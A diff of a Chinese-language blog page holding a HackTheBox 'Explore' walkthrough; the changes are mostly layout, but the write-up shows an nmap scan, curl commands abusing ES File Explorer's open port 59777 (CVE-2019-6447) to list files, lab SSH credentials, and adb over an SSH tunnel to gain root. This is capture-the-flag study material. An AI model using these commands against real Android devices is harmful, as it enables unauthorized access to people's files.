@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;356  10.10.10.247   端口扫描应该是HTB第一台Android靶机，需要全端口扫描： 12345678910111213$ nmap -p- 10.10.10.247Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-28 0">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;356  10.10.10.247                                                                                                              端口扫描应该是HTB第一台Android">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Explore - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/06/28/Explore-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;356  10.10.10.247   端口扫描应该是HTB第一台Android靶机，需要全端口扫描： 12345678910111213$ nmap -p- 10.10.10.247Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-28 0">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;356  10.10.10.247                                                                                                              端口扫描应该是HTB第一台Android">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062801.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062802.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062803.jpg">
@@ -127,7 +127,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -217,14 +217,28 @@
 </li>
 <li><h2 id="10-10-10-247"><a href="#10-10-10-247" class="headerlink" title="10.10.10.247"></a>10.10.10.247</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062801.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062801.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>应该是HTB第一台Android靶机，需要全端口扫描：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -p- 10.10.10.247</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-28 08:59 CST</span><br><span class="line">Nmap scan report for 10.10.10.247</span><br><span class="line">Host is up (0.073s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">2222/tcp  open     EtherNetIP-1</span><br><span class="line">5555/tcp  filtered freeciv</span><br><span class="line">38991/tcp open     unknown</span><br><span class="line">42135/tcp open     unknown</span><br><span class="line">59777/tcp open     unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 985.66 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="59777"><a href="#59777" class="headerlink" title="59777"></a>59777</h2><p>直接访问是禁止目录列举：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062802.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062802.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="ES-File-Explorer"><a href="#ES-File-Explorer" class="headerlink" title="ES File Explorer"></a>ES File Explorer</h1><p>直接搜索android 59777，可以发现是ES File Explorer：</p>
 <ul>
 <li>Android file manager app exposing user data through open port | The Daily Swig<br><a href="https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port" target="_blank" rel="noopener">https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port</a></li>
@@ -232,21 +246,70 @@
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl --header "Content-Type: application/json" --request POST --data '&#123;"command":"[my_awesome_cmd]"&#125;' http://192.168.0.8:59777</span><br><span class="line"></span><br><span class="line">curl --header "Content-Type: application/json" --request POST --data '&#123;"command":"getDeviceInfo"&#125;' http://10.10.10.247:59777</span><br><span class="line">curl --header "Content-Type: application/json" --request POST --data '&#123;"command":"listFiles"&#125;' http://10.10.10.247:59777/sdcard</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062803.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062803.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>sdcard目录下发现user.txt，直接访问即可：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062804.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062804.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="Creds信息"><a href="#Creds信息" class="headerlink" title="Creds信息"></a>Creds信息</h1><p>DCIM里有个creds.jpg:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kristi</span><br><span class="line">Kr1sT!5h@Rp3xPl0r3!</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062805.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062806.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062805.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062806.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>这个账号密码可以ssh登录：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062807.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062807.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="adb-amp-root-flag"><a href="#adb-amp-root-flag" class="headerlink" title="adb &amp; root flag"></a>adb &amp; root flag</h1><p>端口扫描发现5555被过滤，可以通过ssh端口转发后adb连接，能直接su：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222</span><br><span class="line"></span><br><span class="line">adb connect localhost:5555</span><br><span class="line">adb shell</span><br><span class="line">su</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062808.jpg" alt=""></p>
-<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062809.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062808.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021062809.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Android file manager app exposing user data through open port | The Daily Swig<br><a href="https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port" target="_blank" rel="noopener">https://portswigger.net/daily-swig/android-file-manager-app-exposing-user-data-through-open-port</a></li>
 <li>fs0c131y/ESFileExplorerOpenPortVuln: ES File Explorer Open Port Vulnerability - CVE-2019-6447<br><a href="https://github.com/fs0c131y/ESFileExplorerOpenPortVuln" target="_blank" rel="noopener">https://github.com/fs0c131y/ESFileExplorerOpenPortVuln</a></li>
